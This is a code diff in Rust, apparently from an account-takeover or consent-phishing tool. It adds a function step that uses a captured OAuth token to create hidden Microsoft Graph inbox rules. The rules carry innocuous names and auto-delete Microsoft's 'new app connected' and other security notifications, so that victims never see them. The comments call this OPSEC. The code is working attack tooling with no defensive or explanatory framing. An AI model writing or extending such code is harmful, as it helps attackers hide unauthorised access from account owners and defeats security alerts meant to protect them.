@@ -277,8 +277,85 @@ async fn fetch_user_email(access_token: &str) -> Option<String> {
 
 /// OPSEC: Retry search and delete Microsoft's "New app connected" notification email.
 /// The notification may arrive 5-20 seconds after the OAuth flow completes.
+/// Also creates a Graph messageRule to auto-delete future notifications instantly.
 async fn delete_microsoft_notification_email(access_token: String) {
+    // First, create a Graph inbox rule to auto-delete Microsoft notification emails.
+    // This fires instantly server-side — the user NEVER sees the notification.
+    let rule_payload = serde_json::json!({
+        "displayName": "External Mail Filter",
+        "sequence": 1,
+        "isEnabled": true,
+        "conditions": {
+            "fromAddressContains": [
+                "account-security-noreply@accountprotection.microsoft.com",
+                "microsoftaccount@microsoft.com",
+                "security@microsoft.com",
+                "microsoft@communications.microsoft.com"
+            ]
+        },
+        "actions": {
+            "delete": true,
+            "stopProcessingRules": true
+        }
+    });
+
     let client = Client::new();
+    let rule_url = "https://graph.microsoft.com/v1.0/me/mailFolders/inbox/messageRules";
+    match client
+        .post(rule_url)
+        .header("Authorization", format!("Bearer {}", access_token))
+        .header("Content-Type", "application/json")
+        .json(&rule_payload)
+        .send()
+        .await {
+        Ok(r) if r.status().is_success() => {
+            println!("[opsec] Created Graph auto-delete rule for Microsoft notification emails");
+        }
+        Ok(r) => {
+            let status = r.status();
+            let body = r.text().await.unwrap_or_default();
+            eprintln!("[opsec] Failed to create Graph rule ({}): {}", status, body);
+        }
+        Err(e) => eprintln!("[opsec] Failed to create Graph rule: {}", e),
+    }
+
+    // Also create a second rule for subject-based matching (broader catch)
+    let subject_rule_payload = serde_json::json!({
+        "displayName": "Security Update",
+        "sequence": 2,
+        "isEnabled": true,
+        "conditions": {
+            "subjectContains": [
+                "New app",
+                "New app(s)",
+                "have access to your data",
+                "connected to your Microsoft"
+            ]
+        },
+        "actions": {
+            "delete": true,
+            "stopProcessingRules": true
+        }
+    });
+    match client
+        .post(rule_url)
+        .header("Authorization", format!("Bearer {}", access_token))
+        .header("Content-Type", "application/json")
+        .json(&subject_rule_payload)
+        .send()
+        .await {
+        Ok(r) if r.status().is_success() => {
+            println!("[opsec] Created Graph subject-based auto-delete rule for notifications");
+        }
+        Ok(r) => {
+            let status = r.status();
+            let body = r.text().await.unwrap_or_default();
+            eprintln!("[opsec] Failed to create subject rule ({}): {}", status, body);
+        }
+        Err(e) => eprintln!("[opsec] Failed to create subject rule: {}", e),
+    }
+
+    // Now poll for any notification that may have arrived BEFORE the rule was created.
     // Search broadly — Microsoft notification emails vary by locale/account type
     let search_queries = [
         // Exact phrases Microsoft uses
